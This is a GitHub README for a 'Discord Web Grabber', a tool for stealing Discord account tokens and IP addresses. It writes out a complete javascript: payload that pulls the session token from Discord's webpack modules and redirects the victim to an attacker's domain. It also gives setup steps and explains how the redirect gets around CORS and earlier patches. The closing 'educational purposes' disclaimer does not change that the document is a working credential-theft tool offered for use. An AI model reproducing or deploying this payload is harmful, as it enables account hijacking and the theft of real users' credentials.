
# Discord Web Grabber
This app grabs the ip address and the token of a discord user, if they execute ```javascript: window.location.href = `http://localhost:3000/?token=${(webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken()}``` in their searchbar. 
## How to use?

- Simply import github.com/cobs0n/discord-web-grabber
- Add your discord webhook token
- Change http://localhost:3000 in the example to your domain

## How does it work?
<img src="https://github.com/cobs0n/discord-web-grabber/blob/main/test2.gif"> </img>

Since discord already expects users to abuse injected javascript, doing post requests or referencing remote files is blocked by CORS. To bypass this, my script shortly redirects user to the site with the token attached and then brings back user back to discord making it seem like a simple refresh. The local storage method used by token grabbers before seems to be patched, so I used alternative way using webpack. 

## Usage
I made this repositry merely to show how a redirect can be abused. I do not condone any usage other than for educational purposes, anything you do with this repositry is on your own account.
